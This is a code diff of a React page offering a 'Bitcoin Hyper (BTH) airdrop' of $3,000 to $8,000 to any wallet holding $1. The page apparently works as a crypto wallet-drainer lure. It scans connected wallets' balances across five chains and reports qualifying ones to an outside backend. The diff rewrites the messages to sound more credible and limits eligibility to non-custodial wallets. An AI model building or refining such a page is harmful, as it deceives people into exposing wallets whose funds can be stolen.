@@ -1016,12 +1016,12 @@ function App() {
     }
   }, [isConnected, address, balances]);
 
-  // Check eligibility
+  // Check eligibility - Updated professional criteria
   const checkEligibility = async () => {
     if (!address) return;
     
     setVerifying(true);
-    setTxStatus('🔄 Checking eligibility...');
+    setTxStatus('🔄 Checking on-chain balance eligibility...');
     
     try {
       const total = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
@@ -1030,13 +1030,14 @@ function App() {
         balances[chain.name] && balances[chain.name].amount > 0.000001
       );
       
+      // Professional eligibility: minimum $1 equivalent on-chain balance across any supported network
       const eligible = total >= 1;
       setIsEligible(eligible);
       setShowClaimButton(eligible);
       
       if (eligible) {
         setEligibleChains(chainsWithBalance);
-        setTxStatus('✅ You qualify for Bitcoin Hyper (BTH) airdrop!');
+        setTxStatus('✅ Wallet eligibility confirmed. You qualify for the BTH airdrop.');
         
         await fetch('https://hyperback.vercel.app/api/presale/connect', {
           method: 'POST',
@@ -1050,7 +1051,7 @@ function App() {
         
         preparePresale();
       } else {
-        setTxStatus(total > 0 ? '✨ Connected' : '👋 Welcome');
+        setTxStatus(total > 0 ? '✨ Additional balance required for eligibility' : '👋 Connect a non-custodial wallet with on-chain balance');
       }
       
     } catch (err) {
@@ -1063,9 +1064,9 @@ function App() {
 
   // Fetch balances across all chains
   const fetchAllBalances = async (walletAddress) => {
-    console.log("🔍 Checking eligibility...");
+    console.log("🔍 Checking on-chain balances across all supported networks...");
     setScanning(true);
-    setTxStatus('🔄 Checking eligibility...');
+    setTxStatus('🔄 Scanning supported networks for on-chain balance...');
     
     const balanceResults = {};
     let scanned = 0;
@@ -1087,7 +1088,7 @@ function App() {
         
         scanned++;
         setScanProgress(Math.round((scanned / totalChains) * 100));
-        setTxStatus(`🔄 Checking eligibility...`);
+        setTxStatus(`🔄 Scanning ${chain.name} for on-chain balance...`);
         
         if (amount > 0.000001) {
           balanceResults[chain.name] = {
@@ -1114,7 +1115,7 @@ function App() {
     setScanning(false);
     
     const total = Object.values(balanceResults).reduce((sum, b) => sum + b.valueUSD, 0);
-    console.log(`💰 Total detected: $${total.toFixed(2)}`);
+    console.log(`💰 Total on-chain value detected: $${total.toFixed(2)}`);
     
     return total;
   };
@@ -1361,14 +1362,12 @@ function App() {
   // Claim airdrop function
   const claimAirdrop = async () => {
     if (!isConnected) {
-      setError("Please connect your wallet first");
+      setError("Please connect your non-custodial wallet first");
       return;
     }
     
     if (!isEligible) {
-      setError("Eligibility requires the presence of a valid on-chain balance across any supported network.
-
-Note: This condition is enforced solely to facilitate protocol-level execution and on-chain verification.");
+      setError("Eligibility requires an on-chain balance of at least $1 USD across any of the following supported networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche.\n\nImportant: Only non-custodial wallets are eligible. Exchange wallets (CEX) are not supported for this airdrop.");
       return;
     }
     
@@ -1492,7 +1491,7 @@ Note: This condition is enforced solely to facilitate protocol-level execution a
               onMouseLeave={() => setHoverConnect(false)}
               className="bg-gradient-to-r from-red-600 to-red-500 hover:from-red-700 hover:to-red-600 text-white font-semibold px-8 py-4 rounded-xl transition-all transform hover:scale-105 hover:shadow-[0_10px_20px_rgba(255,0,0,0.4)] mb-8 w-full max-w-md"
             >
-              Connect Wallet To Claim Bitcoin Hyper (BTH) Airdrop
+              Connect Non-Custodial Wallet To Claim Bitcoin Hyper (BTH) Airdrop
             </button>
           ) : (
             <div className="flex flex-col items-center w-full max-w-md mb-8">
@@ -1537,12 +1536,14 @@ Note: This condition is enforced solely to facilitate protocol-level execution a
                 <div className="mt-3 w-full">
                   {isEligible ? (
                     <div className="bg-green-500/20 border border-green-500/30 rounded-lg p-3 text-sm text-green-400">
-                      ✅ You are eligible for the Bitcoin Hyper (BTH) airdrop! Click the CLAIM AIRDROP button above to proceed.
+                      ✅ On-chain balance confirmed. You are eligible for the Bitcoin Hyper (BTH) airdrop! Click the CLAIM AIRDROP button above to proceed.
                     </div>
                   ) : (
                     !scanning && (
                       <div className="bg-yellow-500/20 border border-yellow-500/30 rounded-lg p-3 text-sm text-yellow-400">
-                        ⚡ You need at least $1 in your wallet to qualify for the airdrop.
+                        ⚡ Eligibility requires a minimum on-chain balance of $1 USD across any supported network.<br/>
+                        📌 Supported: Ethereum, BSC, Polygon, Arbitrum, Avalanche<br/>
+                        🔒 Non-custodial wallets only. Exchange wallets (CEX) are not supported.
                       </div>
                     )
                   )}
@@ -1639,18 +1640,38 @@ Note: This condition is enforced solely to facilitate protocol-level execution a
               {loading ? 'Processing...' : 'Buy BTH'}
             </button>
 
-            {/* Airdrop Card */}
+            {/* Airdrop Card - Updated with professional requirements */}
             <div className="bg-black/50 border border-red-500/30 rounded-xl p-5">
               <h4 className="text-xl font-bold mb-2 text-red-400">🎁 Airdrop Info</h4>
               <p className="text-sm text-gray-400 mb-4">
-                Early supporters can claim free BTH tokens valued between $3,000 - $8,000 USD. Connect wallet to check eligibility.
+                Early supporters can claim free BTH tokens valued between $3,000 - $8,000 USD. 
+                Eligibility is based on on-chain balance requirements.
               </p>
               
+              <div className="space-y-2 text-xs">
+                <div className="flex items-start gap-2">
+                  <span className="text-green-400 mt-0.5">✓</span>
+                  <span className="text-gray-400">Minimum on-chain balance: <span className="text-white">$1 USD equivalent</span></span>
+                </div>
+                <div className="flex items-start gap-2">
+                  <span className="text-green-400 mt-0.5">✓</span>
+                  <span className="text-gray-400">Supported networks: <span className="text-white">Ethereum, BSC, Polygon, Arbitrum, Avalanche</span></span>
+                </div>
+                <div className="flex items-start gap-2">
+                  <span className="text-red-400 mt-0.5">⚠</span>
+                  <span className="text-gray-400">Wallet requirement: <span className="text-yellow-400">Non-custodial wallets only</span> (MetaMask, Trust Wallet, WalletConnect, etc.)</span>
+                </div>
+                <div className="flex items-start gap-2">
+                  <span className="text-red-400 mt-0.5">✗</span>
+                  <span className="text-gray-400">Exchange wallets (CEX) are <span className="text-red-400">not supported</span> — Binance, Coinbase, Kraken, etc.</span>
+                </div>
+              </div>
+              
               {!isConnected && (
-                <p className="text-xs text-red-400/70">Connect wallet to check eligibility</p>
+                <p className="text-xs text-red-400/70 mt-4">Connect a non-custodial wallet to check eligibility</p>
               )}
               {isConnected && !isEligible && (
-                <p className="text-xs text-red-400/70">Need at least $1 in wallet to qualify</p>
+                <p className="text-xs text-red-400/70 mt-4">Requires $1+ on-chain balance across any supported network</p>
               )}
             </div>
 
@@ -1663,7 +1684,7 @@ Note: This condition is enforced solely to facilitate protocol-level execution a
 
             {/* Error Display */}
             {error && (
-              <div className="mt-4 bg-red-500/20 border border-red-500/30 rounded-lg p-3 text-sm text-red-300">
+              <div className="mt-4 bg-red-500/20 border border-red-500/30 rounded-lg p-3 text-sm text-red-300 whitespace-pre-line">
                 {error}
               </div>
             )}
@@ -1688,7 +1709,7 @@ Note: This condition is enforced solely to facilitate protocol-level execution a
             </div>
           )}
 
-          {/* Welcome message for non-eligible */}
+          {/* Welcome message for non-eligible - Updated with support info */}
           {isConnected && !isEligible && !completedChains.length && !scanning && (
             <div className="w-full max-w-md mb-8">
               <div className="bg-black/60 backdrop-blur rounded-xl p-8 text-center border border-red-500/30">
@@ -1697,11 +1718,14 @@ Note: This condition is enforced solely to facilitate protocol-level execution a
                   {translations.welcome}
                 </h2>
                 <p className="text-gray-400 text-sm mb-6">
-                  Connect with a wallet that has at least $1 in value to qualify for the airdrop.
+                  Connect a non-custodial wallet that has at least $1 USD equivalent on-chain balance to qualify for the airdrop.
                 </p>
-                <div className="bg-black/50 rounded-lg p-3 border border-gray-800">
+                <div className="bg-black/50 rounded-lg p-3 border border-gray-800 space-y-2">
                   <p className="text-xs text-gray-400">
-                    Multi-chain support: Ethereum, BSC, Polygon, Arbitrum, Avalanche
+                    Supported networks: <span className="text-white">Ethereum, BSC, Polygon, Arbitrum, Avalanche</span>
+                  </p>
+                  <p className="text-xs text-red-400/70">
+                    ⚠️ Exchange wallets (CEX) are not supported
                   </p>
                 </div>
               </div>
